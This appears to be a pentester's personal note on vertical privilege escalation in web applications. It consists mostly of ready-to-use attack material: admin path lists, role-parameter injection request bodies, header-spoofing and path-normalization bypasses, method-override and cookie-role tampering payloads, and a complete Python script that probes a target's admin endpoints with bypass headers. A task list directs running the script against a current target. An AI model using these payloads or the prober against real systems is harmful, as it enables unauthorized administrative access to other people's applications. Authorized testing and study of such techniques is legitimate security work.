---
tags: [bac, attack, privilege-escalation, vertical]
type: attack
severity: critical
date: 2026-03-10
---

# 🚀 Privilege Escalation Techniques

## Recon for Admin/Privileged Endpoints

```bash
# Extract endpoints from JavaScript files
grep -Eo '"/(api|admin|internal|management|v[0-9]+)/[^"]*"' *.js
grep -Eo "fetch\(['\"][^'\"]+['\"]" *.js
grep -Eo "axios\.(get|post|put|delete)\(['\"][^'\"]+['\"]" *.js

# LinkFinder — bulk JS endpoint extraction
python3 linkfinder.py -i https://target.com -d -o results.html

# GAP (Burp extension) — auto-extracts from all in-scope JS
# DevTools → Sources → search for: "admin", "role", "privilege", "isAdmin"
```

---

## Pattern 1: Direct Admin Panel Access
```http
# Test these paths — both unauthenticated AND as low-priv user:
/admin                 /administrator        /administration
/management            /manage               /superuser
/su                    /root                 /internal
/staff                 /moderator            /control-panel
/cpanel                /wp-admin             /dashboard/admin
/api/admin             /api/internal         /api/v1/admin
```

## Pattern 2: Role Parameter Injection at Registration
```http
POST /api/register
{
  "email": "test@test.com",
  "password": "Pass123",
  "role": "admin",
  "is_admin": true,
  "account_type": "staff",
  "permissions": ["*"]
}
```

## Pattern 3: Header-Based Bypass
```http
X-Original-URL: /admin/panel      ← server routes on this, not request path
X-Rewrite-URL: /admin/panel
X-Forwarded-For: 127.0.0.1        ← "you're internal"
X-Real-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Host: internal.target.com
X-Forwarded-Host: internal.target.com
```

## Pattern 4: Path Bypass for Admin Endpoints
```
/admin/panel   →  /ADMIN/panel        (case insensitive filesystem)
               →  /admin/./panel      (dot normalization)
               →  /admin/../admin/panel
               →  /%61dmin/panel      (URL encode 'a')
               →  /admin%2fpanel      (encoded slash)
               →  /admin;/panel       (Spring Boot semicolon)
               →  /admin/panel/       (trailing slash)
               →  /admin/panel.json   (extension swap)
               →  /admin/panel%00     (null byte)
```

## Pattern 5: HTTP Method Override on Protected Endpoints
```http
# Endpoint blocks DELETE but honors POST + override header:
POST /api/admin/deleteUser HTTP/1.1
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
X-HTTP-Method: DELETE
```

## Pattern 6: Cookie/JWT Role Manipulation
```http
# Role in cookie:
Cookie: role=user; session=abc123  →  role=admin
Cookie: isAdmin=false              →  isAdmin=true
Cookie: userType=2                 →  userType=0  (legacy: 0=admin)

# JWT in cookie → decode → modify role claim → re-sign (see [[JWT-Misconfiguration]])
```

---

## Automation Script — Admin Prober with Working Bypass Headers

```python
#!/usr/bin/env python3
"""
Admin endpoint prober — tests paths with multiple bypass header variants.
All header sets are actually applied to requests (unlike naive implementations).
"""
import requests

TARGET    = "https://target.com"
LOW_TOKEN = "YOUR_LOW_PRIV_TOKEN"
USE_BEARER = False   # True = Authorization: Bearer, False = Cookie: session=

ADMIN_PATHS = [
    "/admin", "/admin/users", "/admin/config", "/admin/logs",
    "/admin/export", "/api/admin", "/api/v1/admin/users",
    "/api/v1/admin/config", "/management", "/internal",
    "/internal/admin", "/api/admin/audit", "/superuser",
    "/staff", "/api/admin/impersonate",
]

# Each entry is a dict of extra headers to send with the request.
# The path key is handled specially: send to "/" with X-Original-URL.
BYPASS_SETS = [
    {"_mode": "direct"},                                # no extra headers
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"_mode": "x-original-url"},                       # send to / with override
]

session = requests.Session()
if USE_BEARER:
    session.headers["Authorization"] = f"Bearer {LOW_TOKEN}"
else:
    session.cookies.set("session", LOW_TOKEN)
session.headers["User-Agent"] = "Mozilla/5.0 (Security Research)"

def test(path, extra_headers):
    mode = extra_headers.pop("_mode", "direct")
    try:
        if mode == "x-original-url":
            h = {"X-Original-URL": path, **extra_headers}
            r = session.get(f"{TARGET}/", headers=h, timeout=8, allow_redirects=False)
        else:
            r = session.get(f"{TARGET}{path}", headers=extra_headers,
                            timeout=8, allow_redirects=False)
        return r.status_code, len(r.text), mode, extra_headers
    except Exception as e:
        return None, 0, mode, str(e)

print(f"[*] Testing {len(ADMIN_PATHS)} paths × {len(BYPASS_SETS)} bypass variants\n")

for path in ADMIN_PATHS:
    for bypass in BYPASS_SETS:
        bypass_copy = dict(bypass)   # don't mutate the template
        code, size, mode, hdrs = test(path, bypass_copy)
        if code and code not in {400, 401, 403, 404, 405, 429, 500, 301, 302}:
            hdr_desc = str(hdrs) if hdrs else f"mode={mode}"
            print(f"  [!] {code} | {size:6d}b | {path:40s} | {hdr_desc}")
```

---

## Tasks
- [ ] #task Extract all admin/internal endpoints from JS files
- [ ] #task Run admin prober script against current target
- [ ] #task Test each admin endpoint unauthenticated
- [ ] #task Test header bypasses (X-Forwarded-For, X-Original-URL, etc.)
- [ ] #task Test path normalization variants on every 403
- [ ] #task Check all registration/update endpoints for role parameters
- [ ] #task Inspect cookies and JWTs for role indicators

---

## 🔗 Related Notes
- [[Horizontal-vs-Vertical]]
- [[JWT-Misconfiguration]]
- [[HTTP-Method-Abuse]]
- [[Path-Traversal-BAC]]
- [[Bypass-Payloads]]

---
*Tags: #privilege-escalation #vertical #attack #bac*
